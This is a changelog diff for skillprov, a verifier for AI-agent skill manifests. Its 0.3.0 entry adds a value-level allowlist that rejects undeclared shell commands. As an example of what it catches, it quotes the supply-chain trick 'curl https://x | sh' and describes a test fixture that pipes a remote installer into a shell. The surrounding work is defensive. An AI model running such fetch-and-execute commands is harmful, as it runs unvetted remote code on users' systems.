@@ -4,6 +4,39 @@ All notable changes to this project are documented here. The format is based on
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project
 adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.3.0] - 2026-06-27
+
+Closes the last class-level capability hole. After v0.2 turned the network-host and
+env-var allowlists into value-level diffs, `exec` was the only capability still
+collapsed to a class boolean: a skill declaring `commands: [git]` could quietly run
+`curl https://x | sh` and still verify green. `verify` now diffs the declared exec
+**command** allowlist at value granularity, so every undeclared shell-out is named
+and rejected — the classic `curl | sh` supply-chain trick included.
+
+### Added
+
+- **m7 — value-level exec command allowlist (`internal/verify/execdiff.go`)**
+  When a manifest declares a finite `commands` allowlist (no `"*"` wildcard), every
+  observed external command must appear in it; any residual command is an undeclared
+  capability and rejects the skill, naming the exact command and its `file:line`. A
+  wildcard `"*"` keeps the permissive path for skills that intentionally declared
+  open exec.
+- The scanner now extracts observed command **names** (`argv[0]`) from exec-style API
+  calls (`subprocess.run`, `exec.Command`, …), shell command substitutions
+  (`` `…` `` / `$(…)`), bare shell command lines, and piped commands — so
+  `curl … | sh` records both `curl` and `sh`. Shell keywords/builtins (`if`, `for`,
+  `set`, `echo`, …) are filtered out.
+- A new `capabilities.commands:` SKILL.md frontmatter field for declaring the exec
+  command allowlist (mirrors `hosts:` / `env-vars:`).
+- `testdata/exec-mismatch` fixture: declares `commands: [git]` but pipes a remote
+  installer into a shell; `verify` goes red naming the undeclared `curl` and `sh`.
+
+### Changed
+
+- `verify`'s capability-conformance stage now runs the exec allowlist diff alongside
+  the existing host and env-var diffs; the rejection message gains an
+  `undeclared exec command "<cmd>" observed at <file>:<line>` line.
+
 ## [0.2.0] - 2026-06-19
 
 Hardens the core verification promise from class-level to value-level, and ships a
@@ -71,4 +104,6 @@ reaches for a capability it never declared.
 - Bilingual README (Chinese primary, English sibling), MIT license, and an
   asciinema demo cast.
 
+[0.3.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.3.0
+[0.2.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.2.0
 [0.1.0]: https://github.com/SuperMarioYL/skillprov/releases/tag/v0.1.0
